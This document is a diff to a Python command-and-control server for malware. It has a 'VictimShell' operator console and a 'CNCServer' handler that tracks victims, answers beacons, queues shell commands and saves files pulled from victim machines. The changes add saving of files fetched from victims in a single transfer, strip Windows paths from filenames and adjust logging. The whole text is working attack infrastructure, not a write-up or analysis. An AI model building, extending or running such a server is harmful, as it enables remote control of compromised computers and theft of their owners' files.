@@ -105,6 +105,10 @@ class VictimShell(BaseShell):
         global victim_table
         
         parsed_arg = arg.split(' ')
+
+        if '\\' in parsed_arg[-1]:
+            parsed_arg[-1] = parsed_arg[-1].split('\\')[-1]
+
         if len(parsed_arg) == 1:
             if path.isfile(FILE_PATH + parsed_arg[0]):
                 print('{} is already exit in FILE_PATH'.format(parsed_arg[0]))
@@ -116,8 +120,6 @@ class VictimShell(BaseShell):
         else:
             return self.default('gf ' + arg)
 
-        if '\\' in parsed_arg[-1]:
-            parsed_arg[-1] = parsed_arg[-1].split('\\')[-1]
 
         with open(FILE_PATH+parsed_arg[-1], 'wb'):
             pass
@@ -175,7 +177,7 @@ class CNCServer(BaseHTTPRequestHandler):
 
     # ack 응답
     def _response_ack(self):
-        self._response_writer(DDP.raw('ACK', 0, ''.encode(ENCODING)))
+        self._response_writer(DDP.raw('ACK', 0, ''.encode(ENCODING)), logging=False)
 
     # shell request 응답
     def _response_shell_request(self, command):
@@ -216,6 +218,21 @@ class CNCServer(BaseHTTPRequestHandler):
             victim_name = victim_ip
 
         victim_table[victim_ip] = {'name' : victim_name, 'command' : deque(), 'seqName' : deque()}
+
+    def _save_none_seq_file(self, victim_ip, data):
+        try:
+            seq_name = victim_table[victim_ip]['seqName'][0]
+
+            #만약 시퀀스 명이 fullpath이면 \ 를 제거
+            if '\\' in seq_name:
+                seq_name = seq_name.split('\\')[-1]
+
+            with open(FILE_PATH+seq_name, 'wb') as fw:
+                fw.write(data)
+        except Exception as e:
+            Logger.error('none seq file save error : {}'.format(str(e)))
+            return False
+        return True
 
     # sequence 딕셔너리에 데이터 저장
     def _gather_seq_data(self, victim_ip, seq, data, isFTP=True):
@@ -287,9 +304,9 @@ class CNCServer(BaseHTTPRequestHandler):
             return
 
         # ftp나 시퀀스 응답의 경우 로깅 X
-        if parsed_data['type'] != 'FTP_RESPONSE' and parsed_data['sequence'] == 0:
+        if (parsed_data['type'] != 'FTP_RESPONSE' and parsed_data['type'] != 'BEACON_REQUEST') and parsed_data['sequence'] == 0:
             self._logging_parsed_data(victim_ip, parsed_data)
-        else:
+        elif parsed_data['sequence'] != 0:
             Logger.info('{}-{} : receive seq data'.format(victim_ip, parsed_data['type']))
         
 
@@ -319,6 +336,10 @@ class CNCServer(BaseHTTPRequestHandler):
             if not self._merge_seq_data(victim_ip, isFtp):
                 self._response_ddp_error('seq merge error')
                 return
+        elif parsed_data['type'] == 'FTP_RESPONSE' and parsed_data['sequence'] == 0:
+            if not self._save_none_seq_file(victim_ip, parsed_data['data']):
+                self._response_ddp_error('none seq file saving error')
+                return
 
         # type별 함수 호출
         type_function = getattr(self, "_func_"+parsed_data['type'].lower())
@@ -341,7 +362,7 @@ class CNCServer(BaseHTTPRequestHandler):
                     if len(file_name) == 3:
                         self._response_ftp_request(file_name[len(file_name)-2], victim_ip, file_name[len(file_name)-1][:-1])
                     else:
-                        self._response_ftp_request(file_name[len(file_name)-1], victim_ip, file_name[len(file_name)-1][:-1])
+                        self._response_ftp_request(file_name[len(file_name)-1][:-1], victim_ip, file_name[len(file_name)-1][:-1])
                     return
             # shell 명령어 처리
             else:
